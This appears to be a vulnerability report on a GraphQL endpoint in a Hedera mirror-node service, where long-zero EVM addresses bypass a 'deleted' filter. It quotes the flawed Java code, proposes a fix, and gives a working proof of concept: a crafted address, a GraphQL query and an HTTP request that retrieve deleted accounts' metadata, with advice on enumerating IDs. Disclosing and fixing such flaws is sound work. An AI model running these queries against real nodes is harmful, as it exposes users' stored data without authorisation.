### Title
Deleted Entity Exposed via Long-Zero EVM Address Bypass of `deleted` Filter in GraphQL `getByEvmAddressAndType()`

### Summary
`EntityServiceImpl.getByEvmAddressAndType()` routes long-zero EVM addresses (first 12 bytes all zero) through `entityRepository.findById()`, which is the raw Spring Data `CrudRepository.findById()` and carries no `deleted` filter. The `findByEvmAddress()` branch used for all other addresses explicitly enforces `deleted is not true`. Any unauthenticated caller who knows (or enumerates) a deleted entity's numeric ID can craft a long-zero address encoding that ID and retrieve the deleted entity's full metadata through the public GraphQL endpoint.

### Finding Description
**Exact code path:**

`AccountController.account()` → `EntityService.getByEvmAddressAndType()` → `EntityServiceImpl` lines 34–41:

```java
// EntityServiceImpl.java lines 34-41
public Optional<Entity> getByEvmAddressAndType(String evmAddress, EntityType type) {
    byte[] evmAddressBytes = decodeEvmAddress(evmAddress);
    var buffer = ByteBuffer.wrap(evmAddressBytes);
    if (buffer.getInt() == 0 && buffer.getLong() == 0) {          // first 12 bytes == 0
        return entityRepository.findById(buffer.getLong())         // ← NO deleted filter
                               .filter(e -> e.getType() == type);
    }
    return entityRepository.findByEvmAddress(evmAddressBytes)      // ← has deleted filter
                           .filter(e -> e.getType() == type);
}
``` [1](#0-0) 

The `findByEvmAddress` query explicitly guards against deleted entities:

```sql
select * from entity where evm_address = ?1 and deleted is not true
``` [2](#0-1) 

But the `findById()` branch at line 38 is the bare `CrudRepository.findById(Long)` — it issues `SELECT * FROM entity WHERE id = ?` with no `deleted` predicate. A deleted entity with `deleted = true` is returned unchanged.

**Root cause / failed assumption:** The developer assumed that the long-zero address path (Hedera's synthetic mirror-address convention) would only ever resolve live entities, so no explicit `deleted` guard was added. This assumption is wrong: the `entity` table retains rows with `deleted = true` indefinitely.

**Exploit flow:**
1. Attacker learns (or brute-forces) the numeric ID of a deleted account, e.g. `1000`.
2. Attacker constructs a 20-byte long-zero EVM address: bytes 0–11 = `0x00`, bytes 12–19 = big-endian `1000` → `0x0000000000000000000000000000000000000003E8`.
3. Attacker sends a GraphQL query to the public endpoint:
   ```graphql
   query {
     account(input: { evmAddress: "0x0000000000000000000000000000000000000003E8" }) {
       alias balance createdTimestamp deleted entityId { shard realm num }
       expirationTimestamp key memo type
     }
   }
   ```
4. `decodeEvmAddress` decodes the hex; `buffer.getInt()==0 && buffer.getLong()==0` is true; `findById(1000)` returns the deleted entity; the type filter passes; `accountMapper.map()` serialises it; the full entity record is returned in the HTTP 200 response. [3](#0-2) 

**Why existing checks are insufficient:** The only guard in the long-zero branch is the `EntityType` filter (`.filter(e -> e.getType() == type)`). There is no `.filter(e -> !Boolean.TRUE.equals(e.getDeleted()))` or equivalent. The `findByAlias` path also carries `deleted is not true`, making the long-zero branch the sole inconsistent path. [4](#0-3) 

### Impact Explanation
An unprivileged external user can retrieve the full stored metadata of any deleted account or contract — including its cryptographic key material, memo, balance at deletion time, alias, expiration timestamp, and `deleted: true` flag — via the public GraphQL API. This constitutes an information-disclosure vulnerability. The synthetic long-zero address used was never legitimately associated with the entity's EVM identity, so the response also misrepresents the entity's address history. Severity: **Medium** (information disclosure of deleted-entity private metadata with no authentication required).

### Likelihood Explanation
The GraphQL endpoint is public and unauthenticated. Hedera entity IDs are sequential integers starting from low values; an attacker can enumerate the entire deleted-entity space with a few thousand requests. No special privileges, tokens, or network position are required. The attack is fully repeatable and scriptable.

### Recommendation
Add an explicit `deleted` guard to the long-zero branch, mirroring the filter already present in `findByEvmAddress`:

```java
if (buffer.getInt() == 0 && buffer.getLong() == 0) {
    return entityRepository.findById(buffer.getLong())
            .filter(e -> !Boolean.TRUE.equals(e.getDeleted()))  // add this
            .filter(e -> e.getType() == type);
}
```

Alternatively, introduce a dedicated repository method `findByIdAndDeletedIsFalse(Long id)` (already present in the `web3` module's `EntityRepository`) and use it here for consistency. [5](#0-4) 

### Proof of Concept
**Precondition:** Entity with numeric ID `1000` exists in the `entity` table with `deleted = true` and `type = ACCOUNT`.

**Step 1 — Construct the long-zero address:**
```
bytes [0..3]  = 0x00000000   (int  == 0)
bytes [4..11] = 0x0000000000000000  (long == 0)
bytes [12..19] = 0x00000000000003E8  (long == 1000)
hex: 0000000000000000000000000000000000000003E8
```

**Step 2 — Send GraphQL request:**
```http
POST /graphql/alpha HTTP/1.1
Content-Type: application/json

{
  "query": "query { account(input: { evmAddress: \"0000000000000000000000000000000000000003E8\" }) { deleted balance key memo } }"
}
```

**Expected (vulnerable) response:**
```json
{
  "data": {
    "account": {
      "deleted": true,
      "balance": 0,
      "key": "<key bytes of deleted account>",
      "memo": "<memo of deleted account>"
    }
  }
}
```

**Expected (fixed) response:**
```json
{ "data": { "account": null } }
```
